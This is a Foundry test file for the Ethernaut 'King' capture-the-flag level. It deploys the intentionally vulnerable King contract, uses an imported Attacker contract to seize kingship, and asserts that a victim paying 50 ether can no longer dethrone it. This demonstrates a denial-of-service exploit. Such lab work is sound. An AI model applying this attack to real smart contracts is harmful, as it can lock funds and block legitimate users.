// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "ethernaut/levels/King.sol";
import {Attacker} from "~/helpers/King.sol";

contract KingTest is Test {
    King target;
    address player;
    address victim;
    Attacker attacker;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 10 ether);

        target = (new King){value: 1 ether}();
        assertEq(target._king(), address(this), "expected test to be king");

        victim = makeAddr("victim");
        vm.deal(victim, 100 ether);
    }

    function attack() private {
        attacker = new Attacker(address(target));
        attacker.attack{value: target.prize()}();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();
        assertEq(target._king(), address(attacker), "attacker must be king");

        // victim gets rekt
        vm.startPrank(victim);
        (bool ok,) = address(target).call{value: 50 ether}("");
        assertFalse(ok, "should have failed to become a king");
        assertEq(target._king(), address(attacker), "attacker must still be the king");
        vm.stopPrank();
    }

    receive() external payable {}
}
